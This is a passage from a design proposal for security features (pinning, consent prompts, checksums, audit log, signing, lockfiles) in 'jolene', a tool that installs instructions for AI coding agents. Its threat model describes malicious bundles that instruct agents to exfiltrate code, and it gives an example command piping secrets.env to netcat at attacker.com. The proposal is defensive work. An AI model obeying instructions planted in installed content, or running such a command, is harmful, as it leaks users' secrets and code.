# Proposal: Security Improvements

**Status:** Ready for implementation
**Date:** 2026-03-29

---

## Problem

Jolene installs content that directly controls AI agent behaviour. Commands,
skills, and agents are natural language instructions that coding agents read
and follow — they can instruct an agent to run shell commands, read and write
files, and make network requests. This makes jolene's install surface a supply
chain for agent instructions, with an attack profile unlike traditional package
managers.

Today, jolene has no content verification, no update consent, no audit trail,
and no mechanism for users to review what they're about to install. A user
running `jolene install --github unknown/bundle` is placing unconditional trust
in that repository to inject arbitrary instructions into every AI tool on their
system.

### What jolene can and cannot do

Jolene cannot make installing untrusted content safe. If a bundle's content
instructs an agent to exfiltrate your code, and you approve the install, jolene
will install it. No tooling substitutes for the user's own judgement about who
to trust — the decision to run someone else's instructions inside your agent is
irreducibly the user's.

What jolene *can* do is make the right thing easy: surface what you're about to
trust, make review practical rather than merely possible, pin what you approved
so it cannot change underneath you, and record what happened. This proposal
defines a layered model built around that division of responsibility. Jolene
smooths the path to an informed decision; it does not make the decision, and it
does not vouch for the bundle you approve.

Framed that way, one layer — pre-install review and consent — is doing the
load-bearing work: it is the moment the user decides whom to trust. Everything past
that moment (pinning, integrity, audit, provenance, lockfiles) is **post-trust
hygiene**: it protects an approved bundle from changing without consent, but it
cannot make an approved bundle trustworthy. The proposal keeps that distinction
explicit rather than implying that more layers add up to safety.

---

## Threat Model

Four threat scenarios drive the design:

| Threat | Description | Current Mitigation |
|--------|-------------|--------------------|
| **Malicious author** | Publishes content that instructs agents to exfiltrate code, run destructive commands, or manipulate projects. | None. |
| **Compromised repository** | Previously trusted repo is force-pushed with malicious content (stolen credentials, CI compromise). | None. `jolene update` pulls whatever is at HEAD. |
| **Supply chain drift** | Benign author pushes a bad update — intentionally or via compromised credentials. Content changes silently on next `jolene update`. | None. No diff, no consent, no record. |
| **Subtle behavioural manipulation** | Content changes are technically non-malicious but alter agent behaviour in ways the user didn't consent to. | None. No visibility into what changed. |

### What makes this different from npm/cargo/pip

1. **The content IS the instructions.** There is no compilation step, no
   sandboxing, no type system. A markdown file telling an agent to
   `cat secrets.env | nc attacker.com 1234` will be followed.

2. **The blast radius is the entire development environment.** AI coding agents
   have shell access, filesystem access, and network access. One compromised
   command can reach everything the agent can reach.

3. **Review is viable.** Unlike minified JS bundles, jolene content is short
   markdown files that humans can actually read. This is an opportunity — the
   security model should make review easy, not merely possible.

4. **Changes are invisible.** A one-line change to a skill's prose can
   fundamentally alter agent behaviour. There is no test suite, no CI, no type
   checker to catch it. The user's eyes are the only defence.

---

## Design Principles

1. **Secure defaults, easy overrides.** Pin by default, require consent by
   default. `--yes` for CI. The secure path must never be harder than the
   insecure path.

2. **Transparency over restriction.** Show users what's happening rather than
   silently blocking. Informed consent beats opaque rules.

3. **The content is readable — point at it.** The user's own review is the real
   control; jolene's job is to make it easy to start. At each decision point,
   show the source URL, the local clone path, the commit, and exactly what will
   be installed, so the user can inspect the actual files before approving.
   Jolene surfaces the material — it does not dump file bodies into the terminal
   and it does not pretend to have read them.

4. **Graceful degradation.** Each layer works independently. A user who doesn't
   care about signing still gets pinning and consent. A user who only wants an
   audit trail is not forced to adopt lockfiles.

5. **Trust is earned, not assumed.** First install from an unknown author
   should feel different from updating a bundle installed months ago.

---

## Layer 1: Commit Pinning

### Summary

Every install pins to a specific commit SHA. Updates become explicit, informed
decisions rather than implicit trust transfers.

### Current behaviour

- `jolene install` clones HEAD and records the commit SHA in state.
- `jolene update` runs `git pull --ff-only`, unconditionally advancing to HEAD.
- There is no way to install a specific version, review what changed, or
  decline an update.

### Proposed behaviour

#### Install changes

A new `--ref` flag on `jolene install`:

```
jolene install --github owner/repo --ref v1.2.0
jolene install --github owner/repo --ref abc1234
jolene install --github owner/repo --ref feature-branch
```

`--ref` accepts a tag, branch name, or commit SHA. After cloning, jolene
checks out the specified ref. If omitted, behaviour is unchanged (HEAD of
default branch). `--ref` works with all source types (`--github`, `--local`,
`--url`) since all are git repositories. For `--local`, the checkout happens
in jolene's store clone (`~/.jolene/repos/{hash}/`), not in the user's
original local repository.

The ref value is stored in state as `ref_pinned` for diagnostic purposes — it
lets jolene know the bundle was installed at a specific ref rather than HEAD of
the default branch. The actual pin is always the resolved commit SHA.

`jolene update` on a `--ref`-installed bundle does **not** silently advance to
the default branch. Instead, it errors with a clear message:

```
$ jolene update review-tools

Error: review-tools was installed with --ref v1.2.0.
  Updates for ref-pinned bundles require an explicit ref. To update:
    jolene update review-tools --ref <new-ref>
  To remove the pin and follow the default branch, reinstall without --ref:
    jolene install --github owner/review-tools
```

This prevents the semantic surprise of `--ref v1.2.0` silently pulling from
`main` on the next update.

Conversely, passing `--ref` to `jolene update` on a bundle that was **not**
installed with `--ref` is an error:

```
$ jolene update review-tools --ref v2.0.0

Error: review-tools was not installed with --ref.
  --ref on update is only valid for ref-pinned bundles.
  To pin this bundle to a specific ref, reinstall with --ref:
    jolene install --github owner/review-tools --ref v2.0.0
```

This keeps the state model simple: a bundle is either ref-pinned (update
requires `--ref`) or default-branch-tracking (update never takes `--ref`).
Crossing between modes requires a reinstall.

Note: removing a ref pin is done by reinstalling without `--ref`, as shown
above. The `jolene trust --clear` command (introduced later, in Layer 5) is
a separate mechanism for removing signature verification requirements.

#### Update changes

`jolene update` becomes a two-phase operation: **fetch** then **review and
accept**.

```
$ jolene update review-tools

╔══════════════════════════════════════════════════════════════════╗
║  WARNING: Updated content will be read and followed by AI        ║
║  coding agents. The changes shown below could alter agent        ║
║  behavior. Review the diff before accepting.                     ║
║                                                                  ║
║  Local clone:  ~/.jolene/repos/a3f2c1d8...abc1234/               ║
║  Remote:       https://github.com/junebug/review-tools           ║
║  Diff:         https://github.com/junebug/review-tools/compare/  ║
║                abc1234...def5678                                 ║
╚══════════════════════════════════════════════════════════════════╝

Fetching review-tools...
  junebug/review-tools: 3 new commits (abc1234 → def5678)

  Content changes:
    ~ commands/review.md         (modified)
    + commands/audit.md          (new command)
    - skills/old-lint/           (removed)

  Commit log:
    def5678 Fix review prompt for large files
    ccc4444 Add audit command
    bbb3333 Remove deprecated old-lint skill

  Apply this update? [y/N]
```

| Response | Action |
|----------|--------|
| `y` | Apply the update (advance to the fetched commit). |
| `N` (default) | Abort. No changes. The fetched objects remain in the git repo but the working tree stays at the pinned commit. |

The summary above is everything needed to start a review before answering: the
local clone path, the GitHub compare URL (for GitHub sources), the file-level
change list, and the commit log. To inspect the actual changes, follow the
compare URL or run `git -C <clone> diff <old>..<new>`. Jolene does not render
diffs in the terminal — it points you at them.

#### Updating all bundles

`jolene update` with no bundle named and no `--all` flag does nothing but print
a usage error. Updating every installed bundle at once is a high-consequence
operation — it re-pulls agent instructions from every upstream you track — so it
must be requested explicitly, never triggered by a bare command or a stray
keystroke:

```
$ jolene update

Error: jolene update requires a bundle name or --all.
  To update one bundle:   jolene update <bundle>
  To update every bundle: jolene update --all
```

`jolene update --all` updates every installed bundle by applying the
single-bundle flow to each one in turn: fetch, show that bundle's summary, and
prompt — or auto-apply if the bundle was installed with `--auto-accept-updates`,
or `--yes` is set. Bundles are handled independently: a decline, a skip, or an
error on one does not stop the others.

```
$ jolene update --all

  junebug/review-tools: 3 new commits (abc1234 → def5678)
    ~ commands/review.md         (modified)
    + commands/audit.md          (new command)
  Apply this update? [y/N] y
    Updated to def5678.

  alice/formatter: 1 new commit (bbb3333 → ccc4444)
    ~ commands/format.md         (modified)
  Apply this update? [y/N] n
    Skipped.

  acme-corp/tools::review-plugin: (up to date)

Updated 1 bundle, skipped 1, 1 already up to date.
```

Handling each bundle on its own — rather than merging everything under one
prompt — keeps every decision scoped to a single source's changes. It also means
a force-pushed bundle (see *Force-push detection* below) is simply reported and
skipped without affecting the rest of the run.

**`--yes` flag:** `jolene update (<bundle> | --all) --yes` skips confirmation
and applies without prompting. The diff summary is still printed (unless
`--quiet`). Intended for CI and scripting.

**`--fetch-only` flag:** `jolene update (<bundle> | --all) --fetch-only` fetches
without prompting or applying. Shows what would change. Equivalent to a
dry-run for updates.

#### New command: `jolene outdated`

```
jolene outdated
```

Fetches remote refs for all installed bundles (without pulling) and reports
which have new commits. Does not modify state or working trees.

Unlike `jolene update --fetch-only` (which fetches git objects into the local
clone and shows a content diff), `jolene outdated` uses lightweight ref queries
(`git ls-remote`) and only reports whether new commits exist. It is faster and
does not modify the local clone at all.

If a fetch fails for an individual bundle (network error, deleted remote),
that bundle is reported with a warning and the command continues with the
remaining bundles. The exit code is 0 if at least one bundle was checked
successfully.

Ref-pinned bundles (installed with `--ref`) are reported as such and
skipped — a pinned commit SHA has no upstream branch to compare against.

```
$ jolene outdated

  junebug/review-tools
    Installed: abc1234 (2026-03-15)
    Remote:    def5678 (3 commits ahead)

  alice/pinned-tools (ref-pinned)
    Installed: bbb3333 (2026-03-10)

  acme-corp/tools::review-plugin
    Installed: fed9876 (2026-03-20)
    Remote:    (up to date)

  broken-org/deleted-repo
    WARNING: Failed to fetch remote refs (repository not found or not accessible)

1 bundle has updates available. Run `jolene update --all` to review.
```

#### Force-push detection

During fetch, jolene verifies that the currently pinned commit is an ancestor
of the fetched HEAD. If the remote has rewritten history (force-push), the
pinned commit may no longer be in the history. This is detected and reported:

```
$ jolene update review-tools

Fetching review-tools...
  WARNING: History rewrite detected for junebug/review-tools.
  The currently pinned commit (abc1234) is no longer an ancestor of
  the remote HEAD. This typically indicates a force-push, which could
  mean the repository was compromised.

  Pinned commit:  abc1234 (2026-03-15)
  Remote HEAD:    xyz9999

  To accept the new history: jolene update review-tools --accept-rewrite
  To keep the current version: do nothing.
```

A `--accept-rewrite` flag is required to proceed when a history rewrite is
detected, and it is valid only together with a named bundle
(`jolene update <bundle> --accept-rewrite`). It is never prompted interactively
— the user must explicitly opt in. During `jolene update --all`,
a force-pushed bundle is reported and skipped like any other; to accept its
rewrite, re-run that bundle by name with `--accept-rewrite`.

### State changes

The commit field already stores the pinned SHA.

New optional field on `BundleState`:

```rust
// Layer 1: original ref value from --ref install, for diagnostic and update-guard purposes
#[serde(default, skip_serializing_if = "Option::is_none")]
pub ref_pinned: Option<String>,
```

When `ref_pinned` is present, `jolene update` requires `--ref` to proceed.

The resolved commit SHA is what gets pinned and stored in state as `commit`.
The original `--ref` value is stored as `ref_pinned` for diagnostic and
update-guard purposes.

### Error messages

```
Error: Unknown ref 'v99.0.0' in junebug/review-tools.
  The ref was not found in the repository. Check the tag or branch name.
```

```
Error: --ref cannot be used with --marketplace.
  Marketplace plugins track the default branch of the marketplace repo.
```

```
Error: --ref cannot be used with --lockfile.
  The lockfile specifies exact commit SHAs for each bundle.
```

---

## Layer 2: Pre-Install Review and Consent

### Summary

Before creating any symlinks, jolene shows the user what will be installed and
asks for confirmation. The default answer is No.

### Current behaviour

`jolene install` proceeds directly from clone to symlink creation with no
confirmation step. The user sees output listing what was installed, but only
after the fact.

### Proposed behaviour

After cloning and validating — but before rendering any templates, checking for
conflicts, or creating any symlinks — jolene displays a warning banner and
summary, then prompts. Nothing touches the target directories until the user
consents:

```
$ jolene install --github unknown-author/agent-tools

╔══════════════════════════════════════════════════════════════════╗
║  WARNING: This content will be read and followed by AI coding   ║
║  agents with shell, file system, and network access. Review it  ║
║  before installing. You are responsible for what you install.   ║
║                                                                ║
║  Local clone:  ~/.jolene/repos/a3f2c1d8...abc1234/             ║
║  Remote:       https://github.com/unknown-author/agent-tools    ║
║  Commit:       https://github.com/unknown-author/agent-tools/   ║
║                commit/abc1234def56789                           ║
╚══════════════════════════════════════════════════════════════════╝

  Bundle: agent-tools v1.0.0
  Author: unknown-author
  License: MIT

  Content to install:
    2 commands: deploy, rollback
    1 skill:    infra-guide (compatibility: requires kubectl)
    1 agent:    ops-assistant

  Targets: claude-code, opencode

  Install? [y/N]
```

For `--github` bundles, the commit line links directly to the commit on GitHub.
For `--url` bundles with GitHub URLs, the same linking applies. For other
`--url` sources, the URL is shown as-is. For `--local` installs, Remote shows
the local source path and no commit link is generated.

| Response | Action |
|----------|--------|
| `y` | Proceed with installation. |
| `N` (default) | Abort. The clone remains in the store (it's just a git repo) but no symlinks or state changes are made. |

The summary above prints everything needed to start a review: the source URL,
the commit URL (for GitHub sources), the local clone path, and the list of
content that will be installed. To read the actual files, browse the clone path
or the source URL. Jolene does not render file contents in the terminal — it
points you at them.

#### The `--yes` flag

```
jolene install --github owner/repo --yes
```

Skips the confirmation prompt. The summary is still printed (unless `--quiet`).
Intended for CI, scripting, and lockfile-based installs.

#### Non-interactive contexts

When stdin is not a TTY (piped input, CI) and `--yes` was not passed, jolene does
**not** silently decline. It exits with a **non-zero** code and a clear message:

```
Error: refusing to install without confirmation in a non-interactive context.
  Re-run with --yes to install unattended, or run interactively to confirm.
```

This is a deliberate, fail-closed **breaking change**: previously a non-TTY
`jolene install` would proceed. Erroring loudly is preferable to returning
success while installing nothing, which would let automation believe a bundle is
present when it is not.

For `jolene update`, the same rule holds for any bundle **not** installed with
`--auto-accept-updates` — a non-interactive update of one without `--yes` errors
rather than proceeding. Bundles installed with `--auto-accept-updates` (see below)
are the exception: they auto-apply and update unattended. CI and most test
harnesses must pass `--yes` for any bundle that lacks the flag.

#### The `--auto-accept-updates` flag

```
jolene install --github owner/repo --auto-accept-updates
```

`--auto-accept-updates` marks a bundle as coming from a source the user controls or has
already vetted — their own repo, an internal mirror, a bundle they authored.
It is recorded in state as `auto_accept_updates: true`. Its only effect is on **updates**:
such a bundle's `jolene update` applies without the interactive accept
prompt — an automatic per-bundle `--yes` — on the theory that re-reviewing every
push to your own repo is friction without benefit.

Crucially, `--auto-accept-updates` lightens the *routine* case without disabling the tripwires
that catch *unexpected* change. On such a bundle, force-push / history-rewrite
detection still requires `--accept-rewrite` (Layer 1), integrity checksums are
still recorded (Layer 3), and audit entries are still written (Layer 4). Trust
removes a prompt, not the safety nets.

First install still prompts once — `--auto-accept-updates` *establishes* trust at a moment the
user is paying attention; it does not assume it. To revoke, reinstall without
`--auto-accept-updates`.

#### Reinstalls

When a bundle is already installed and the user runs `jolene install` again
(e.g. to add a new target), the prompt reflects this:

```
  Bundle already installed (abc1234). Adding target: opencode.
  Proceed? [y/N]
```

This is a lighter prompt: the content is already on the system, so there is
nothing new to review — just a `[y/N]` confirmation for the added target.

#### First-install signals

When installing from an author for the first time, the prompt includes an
advisory note:

```
  Note: First install from this author. No prior trust established.
```

"First install from this author" is determined by checking whether any bundle
in `state.json` shares the same GitHub owner (for `--github`) or domain (for
`--url`). Local bundles skip this check.

#### Local installs

Local bundles (`--local`) show the confirmation prompt with a lighter message.
Local paths imply the user already has the content on their machine, but the
content could come from untrusted sources (downloaded archives, shared network
mounts, `curl | tar` extractions). The prompt uses the same `[y/N]` gate but
omits the first-install-from-author advisory and shows the local source path
instead of a remote URL.

#### Marketplace installs

Marketplace installs show per-plugin summaries:

```
$ jolene install --marketplace --github acme-corp/tools --pick review-plugin,deploy-tools

Fetching acme-corp/tools...
  Cloning https://github.com/acme-corp/tools.git
  Marketplace: acme-tools

  Plugin: review-plugin
    Code review skill for PRs
    Content: 1 skill, 1 command

  Plugin: deploy-tools
    Deployment automation commands
    Content: 2 commands
    Note: hooks detected (not installed by jolene)

  Targets: claude-code

  Install 2 plugins? [y/N]
```

### State changes

New optional field on `BundleState`:

```rust
// Layer 2: --auto-accept-updates; future updates apply without the review prompt
#[serde(default, skip_serializing_if = "Option::is_none")]
pub auto_accept_updates: Option<bool>,
```

`auto_accept_updates` is set to `Some(true)` only when `--auto-accept-updates` is passed at
install. It is absent (deserialised as `None`) for every existing bundle and any
bundle installed without the flag, so no migration is needed — `None` means
"updates prompt as normal."

### `--quiet` interaction

- `--quiet` suppresses the summary output but does **not** suppress the
  confirmation prompt. The prompt is a security mechanism, not informational
  output.
- `--quiet --yes` suppresses both the summary and the prompt.

---

## Layer 3: Integrity Checksums

### Summary

Compute SHA256 checksums of all installed content files. Store them in state.
Verify them during `jolene doctor`. Detect tampering and force-push attacks.

### Current behaviour

State records symlink source and destination paths. There is no checksum,
no integrity verification, and no way to detect if content was modified after
install.

### Proposed behaviour

#### On install

For each content item being installed:

- **Commands and agents** (individual files): SHA256 of the file content.
- **Skills** (directories): SHA256 of each file in the directory, stored as a
  map of relative-path to hash. A single aggregate hash is also computed
  (sorted concatenation of `path:hash` pairs, then SHA256 of that) for quick
  comparison.
- **Templated items**: checksum of the **rendered** copy, not the source
  template. The rendered copy is what the user actually trusts.

Checksums are stored in the `SymlinkEntry` in `state.json`.

#### On `jolene doctor`

Doctor gains an integrity verification step:

```
$ jolene doctor

  junebug/review-tools
    [OK] commands/review.md
    [MODIFIED] skills/code-analysis/SKILL.md
      Expected: a1b2c3d4...
      Actual:   e5f6a7b8...
      The installed content has been modified since installation.
    [OK] skills/style-check/

  1 integrity issue found.
```

This catches:

- Files modified in `repos/` (manual edit or git operations outside jolene).
- Rendered copies modified in `rendered/`.
- Replacement of symlink targets (symlink still valid, but points at different
  content than expected).

Entries that predate integrity tracking have no stored checksum and are reported
as a distinct `[NO CHECKSUM]` status — not a failure. `jolene doctor --backfill`
computes and stores checksums for those entries from the current on-disk content,
so they can be verified on subsequent runs. It is a one-time convenience (see
*Migration*), not a recurring operation.

### State changes

```json
{
  "src": "commands/review.md",
  "dst": "~/.claude/commands/review.md",
  "templated": false,
  "sha256": "a1b2c3d4e5f67890..."
}
```

For skills, the entry gains a `checksums` map instead of a single `sha256`:

```json
{
  "src": "skills/code-analysis",
  "dst": "~/.claude/skills/code-analysis",
  "templated": false,
  "sha256": "aggregate_hash_here",
  "checksums": {
    "SKILL.md": "a1b2c3d4...",
    "references/patterns.md": "e5f6a7b8..."
  }
}
```

New fields use `#[serde(default, skip_serializing_if = "Option::is_none")]`
for backward compatibility with existing state files.

---

## Layer 4: Structured Audit Trail

### Summary

Every state-changing operation writes an entry to an append-only structured
log. Users can query the log to understand what changed and when.

### Current behaviour

No logging. The only record of jolene's actions is the current state file,
which is overwritten on every operation. There is no history.

### Proposed behaviour

#### Audit log file

Location: `~/.jolene/audit.jsonl` (one JSON object per line).

Permissions: `0600` (consistent with state file).

Writes are append-only — jolene never modifies or truncates existing entries.
Each entry is a complete, self-contained record. Audit writes hold the state
lock (`~/.jolene/.lock`), so concurrent appends and log truncation never
interleave.

#### Entry structure

```json
{
  "timestamp": "2026-03-29T14:00:00Z",
  "operation": "install",
  "bundle": "junebug/review-tools",
  "source_kind": "github",
  "commit": "abc1234def5678",
  "targets": ["claude-code", "opencode"],
  "content": {
    "added": [
      "commands/review.md",
      "skills/code-analysis/"
    ]
  },
  "prefix": "jb",
  "jolene_version": "0.5.0"
}
```

**Update entries** include before/after state:

```json
{
  "timestamp": "2026-03-29T15:00:00Z",
  "operation": "update",
  "bundle": "junebug/review-tools",
  "source_kind": "github",
  "old_commit": "abc1234def5678",
  "new_commit": "def5678abc1234",
  "targets": ["claude-code", "opencode"],
  "content": {
    "added": ["commands/audit.md"],
    "removed": ["skills/old-lint/"],
    "modified": ["commands/review.md"]
  },
  "jolene_version": "0.5.0"
}
```

**Uninstall entries:**

```json
{
  "timestamp": "2026-03-29T16:00:00Z",
  "operation": "uninstall",
  "bundle": "junebug/review-tools",
  "source_kind": "github",
  "commit": "def5678abc1234",
  "targets": ["claude-code"],
  "purged": false,
  "jolene_version": "0.5.0"
}
```

#### New command: `jolene audit`

```
jolene audit [<bundle>] [--since <date>] [--operation <op>] [--last <n>]
```

Queries the audit log. Filters are optional and combinable.

```
$ jolene audit review-tools --last 5

  2026-03-29 15:00  update   junebug/review-tools  abc1234 → def5678
                      + commands/audit.md
                      ~ commands/review.md
                      - skills/old-lint/

  2026-03-15 10:00  install  junebug/review-tools  abc1234
                      + commands/review.md
                      + skills/code-analysis/
                      + skills/style-check/
```

```
$ jolene audit --since 2026-03-28

  2026-03-29 16:00  uninstall  acme/tools::review-plugin  (from claude-code)
  2026-03-29 15:00  update     junebug/review-tools       abc1234 → def5678
  2026-03-28 09:00  install    alice/formatter             fff1234
```

#### Log rotation

The audit log is not rotated automatically. For users who want to manage its
size, `jolene audit --clear-before <date>` truncates entries older than the
given date. This is the only operation that modifies existing log content.

`--clear-before` is state-mutating, so it acquires the state lock
(`~/.jolene/.lock`) and rewrites the log via a temp file and atomic rename.
Appends also occur under the lock (they run inside `install` / `update` /
`uninstall`), so truncation is always serialized against concurrent appends.
Read-only `jolene audit` queries do **not** take the lock — consistent with the
other read-only commands (`list`, `info`, `contents`, `doctor`) — but the atomic
rename means a concurrent query sees either the old log or the rewritten one,
never a partial file.

A warning is emitted after any operation that appends to the audit log
(`install`, `update`, `uninstall`, `audit --clear-before`) when the log
exceeds 10 MB, suggesting `--clear-before`. Read-only `jolene audit` queries
do not emit the warning.

---

## Layer 5: Provenance Verification (Commit Signing)

### Summary

Verify that commits are signed with a recognized key. Trust-on-first-use
(TOFU) model: record the signing key on first install, verify on subsequent
updates.

### Current behaviour

No signature verification. Commits are accepted regardless of whether they
are signed.

### Proposed behaviour

#### Opt-in verification

Commit signing verification is opt-in via a `--verify-signature` flag:

```
jolene install --github trusted-org/tools --verify-signature
```

When this flag is set:

1. After cloning, jolene verifies the HEAD commit is signed.
2. If unsigned: error with a message explaining that `--verify-signature` was
   requested but the commit is not signed.
3. If signed: record the signing key's fingerprint in state.

#### TOFU model

Once a signing key is recorded for a bundle (via `--verify-signature` on
install), **all subsequent updates verify against it automatically** — the
`--verify-signature` flag does not need to be repeated.

```
$ jolene install --github trusted-org/tools --verify-signature

  Commit abc1234 signed by: trusted-org (SSH key SHA256:xxxx)
  Trust this key for future updates? [y/N]

  # (user accepts)
  Trusted key recorded. Future updates will verify against this key.
```

On update:

```
$ jolene update trusted-org/tools

  Commit def5678 signed by: trusted-org (SSH key SHA256:xxxx)
  Signature: verified (matches trusted key)

  Content changes:
    ~ commands/review.md
  Apply? [y/N]
```

Key change scenario:

```
$ jolene update trusted-org/tools

  WARNING: Signing key changed for trusted-org/tools.
  Commit fed9876 signed by: new-maintainer (SSH key SHA256:yyyy)

  Previously trusted key: SHA256:xxxx (trusted since 2026-03-01)
  New key:                SHA256:yyyy

  This could indicate a legitimate maintainer change or a compromised
  repository. Verify with the bundle author before accepting.

  Accept new key? [y/N]
```

Unsigned commit when signature is expected:

```
$ jolene update trusted-org/tools

  ERROR: Commit ghi7890 is not signed.
  This bundle was installed with --verify-signature and has a trusted
  signing key on record. The new commit must be signed.

  To update without verification: jolene update trusted-org/tools --skip-verify
  To remove signature requirement: jolene trust trusted-org/tools --clear
```

`--skip-verify` is a one-time bypass. It does **not** modify state — the
`verify_signature` flag and `trusted_keys` remain intact. The next update
will require verification again. To permanently remove the signature
requirement, use `jolene trust <bundle> --clear`.

#### New command: `jolene trust`

```
jolene trust <bundle>                 # Show trust status
jolene trust <bundle> --clear         # Remove signing key requirement
jolene trust <bundle> --add-key KEY   # Add an additional trusted key
```

```
$ jolene trust review-tools

  junebug/review-tools
    Signature verification: enabled
    Trusted keys:
      SSH SHA256:xxxx (trusted since 2026-03-01, last verified 2026-03-29)
    Current commit: def5678 (signed, verified)
```

Jolene delegates signature verification to git rather than implementing its own
crypto, so the user's git must be configured for it (a GPG keyring or an SSH
allowed-signers file). If it is not, jolene reports the failure clearly rather
than silently skipping verification:

```
Error: Cannot verify commit signature — git signature verification
  is not configured. See: git-scm.com/book/en/v2/Git-Tools-Signing-Your-Work
```

### State changes

New fields on `BundleState`:

```json
{
  "source": "junebug/review-tools",
  "verify_signature": true,
  "trusted_keys": [
    {
      "fingerprint": "SHA256:xxxxxxxxxxxx",
      "type": "ssh",
      "trusted_since": "2026-03-01T10:00:00Z",
      "last_verified": "2026-03-29T14:00:00Z"
    }
  ]
}
```

New fields use `#[serde(default, skip_serializing_if)]` for backward
compatibility.

### Limitations

- Requires git to be configured for signature verification (GPG keyring or
  SSH allowed signers file).
- Only verifies the HEAD commit, not the entire commit chain. A signed HEAD
  on top of unsigned history is accepted.
- Key rotation requires explicit user acceptance of the new key.

---

## Layer 6: Reproducible Installs (Lockfile)

### Summary

A lockfile captures the exact set of installed bundles with commit SHAs and
content checksums. It can be committed to a project repository and used to
reproduce the installation on another machine.

### Proposed behaviour

#### New command: `jolene lock`

```
jolene lock [--output <path>]
```

Generates a lockfile from the current installation state. Default output path:
`./jolene.lock` (current working directory, not `~/.jolene/`).

The lockfile reads content checksums from `state.json` (Layer 3). If a bundle
was installed before Layer 3 was implemented and has no checksums in state,
`jolene lock` computes them on the fly from the current content on disk. This
means `jolene lock` always produces a complete lockfile regardless of when
bundles were installed.

```
$ jolene lock
Wrote jolene.lock (3 bundles)
```

#### Lockfile format

TOML for human readability:

```toml
# jolene.lock
# Generated by jolene 0.5.0 on 2026-03-29T14:00:00Z
# Do not edit manually. Regenerate with: jolene lock
schema_version = 1

[[bundle]]
source_kind = "github"
source = "junebug/review-tools"
commit = "abc1234def5678901234567890abcdef12345678"
prefix = "jb"
# reviewed_by = "junebug"         # set by `jolene lock --mark-reviewed`
# reviewed_at = "2026-03-29T14:15:00Z"

  [[bundle.content]]
  type = "command"
  name = "review"
  sha256 = "a1b2c3d4e5f67890..."

  [[bundle.content]]
  type = "skill"
  name = "code-analysis"
  sha256 = "e5f6a7b8c9d01234..."

  [bundle.var_overrides]
  doc_url = "https://internal.corp/docs"

[[bundle]]
source_kind = "github"
source = "acme-corp/tools::review-plugin"
commit = "fed9876abc1234567890abcdef1234567890abcd"
marketplace = "acme-corp/tools"
plugin_name = "review-plugin"

  [[bundle.content]]
  type = "skill"
  name = "review"
  sha256 = "f6e5d4c3b2a19876..."
```

The `schema_version` field enables future format changes with explicit
migration.

#### New flag: `jolene install --lockfile`

```
jolene install --lockfile jolene.lock [--to <target>...] [--yes]
```

Installs all bundles specified in the lockfile, at exactly the commits
recorded. After cloning/pulling, verifies content checksums match. If a
checksum does not match, installation of that bundle is aborted.

```
$ jolene install --lockfile jolene.lock

  Installing from jolene.lock (3 bundles)...

  junebug/review-tools @ abc1234
    Checksum: verified (2 items)
    Installing to claude-code, opencode

  acme-corp/tools::review-plugin @ fed9876
    Checksum: verified (1 item)
    Installing to claude-code

  alice/formatter @ bbb3333
    Checksum: MISMATCH for commands/format.md
    Expected: c1d2e3f4...
    Actual:   a9b8c7d6...
    Skipping alice/formatter — content does not match lockfile.

  2 of 3 bundles installed. 1 failed checksum verification.
```

When `--lockfile` is used:

- `--github`/`--local`/`--url` flags are not permitted (source comes from
  lockfile). In clap, `--lockfile` is added to the `source` `ArgGroup` so
  that it is mutually exclusive with the other source flags. The group
  remains `required(true)` — exactly one of `--github`, `--local`, `--url`,
  or `--lockfile` must be given.
- `--marketplace` is not permitted (marketplace provenance is recorded in the
  lockfile; no separate flag needed).
- `--ref` is not permitted (the lockfile specifies exact commit SHAs).
- `--prefix` is not used (prefix comes from lockfile).
- `--var`/`--vars-json` are not used (overrides come from lockfile).
- `--to` can still be specified to limit targets.
- `--yes` skips confirmation (but checksum verification is always enforced).

#### Review tracking

A lockfile records what should be installed, but only the person who ran
`jolene lock` ever reviewed the content. To make review explicit across teams:

**New flag: `jolene lock --mark-reviewed [--by <name>]`**

Stamps every bundle in the current state as reviewed. Sets `reviewed_by` and
`reviewed_at` fields in the lockfile. Run this after manually reviewing each
bundle's content (by following the pointers jolene prints on install and
inspecting the files).

```
$ jolene lock --mark-reviewed --by "junebug"
Wrote jolene.lock (3 bundles, all marked reviewed)
```

**Lockfile install shows review status:**

```
$ jolene install --lockfile jolene.lock

  Installing from jolene.lock (3 bundles)...

  junebug/review-tools @ abc1234
    Reviewed by junebug on 2026-03-29
    Checksum: verified (2 items)
    Installing to claude-code, opencode

  acme-corp/tools::review-plugin @ fed9876
    NOT YET REVIEWED
    Checksum: verified (1 item)
    [WARNING] This bundle has not been marked as reviewed.
    Review the content before trusting it in your project.
    Installing to claude-code
```

Bundles without a `reviewed_at` field install normally (checksums are still
verified), but the warning is displayed. If a team wants to enforce that all
bundles be reviewed before use, they can add a pre-commit hook or CI check that
grep the lockfile for missing `reviewed_at` fields.

#### Lockfile verification without install

```
jolene lock --verify [--lockfile <path>]
```

Compares the lockfile against current state. Reports bundles that are missing,
have different commits, or have different checksums. Default lockfile path:
`./jolene.lock`.

```
Error: Lockfile not found: ./jolene.lock
  Generate one with: jolene lock
```

```
Error: Lockfile not found: /path/to/custom.lock
```

---

## Interactions & Edge Cases

Each layer is specified in isolation above. Where they combine, the following
rules apply.

**Auto-accept and signature verification are independent.** On a bundle that has
both `--auto-accept-updates` (Layer 2) and a trusted signing key (Layer 5), an
update verifies the signature silently and applies if it is good; a bad or
missing signature is a hard error, exactly as without auto-accept. Auto-accept
removes the review *prompt*, never a *check* — the same holds for every other
tripwire (force-push still requires `--accept-rewrite`, checksums and audit still
record).

**An explicit `--ref` overrides force-push detection.** When the user passes
`--ref` to `jolene install` or `jolene update`, the named ref is itself the
opt-in: jolene checks it out without running the ancestor check, even if the new
commit is not a descendant of the previously pinned one. Force-push detection
(Layer 1) applies only to default-branch updates, where an unexpected
non-fast-forward is a signal rather than a request.

**Ref-pinned bundles ignore auto-accept.** A ref-pinned bundle refuses to update
without an explicit `--ref` (Layer 1). That guard takes precedence over
`--auto-accept-updates`: `jolene update` with no `--ref` errors regardless, so
auto-accept has no effect until the user supplies a new ref.

**Marketplace content.** Marketplace installs go through the same consent gate
(Layer 2) and receive integrity checksums (Layer 3) like native bundles — the
content is just files — and may be installed with `--auto-accept-updates`. They
cannot be `--ref`-pinned (they track the marketplace repo's default branch) and
are not templated, both as already specified.

**Lockfiles pin content, not machine trust.** `jolene lock` (Layer 6) records
what to install — commit SHAs, checksums, prefix, variable overrides, marketplace
provenance — and nothing about per-machine trust. `ref_pinned`,
`auto_accept_updates`, and signature trust (`verify_signature` / `trusted_keys`)
are **not** written to or restored from a lockfile; they are properties of a
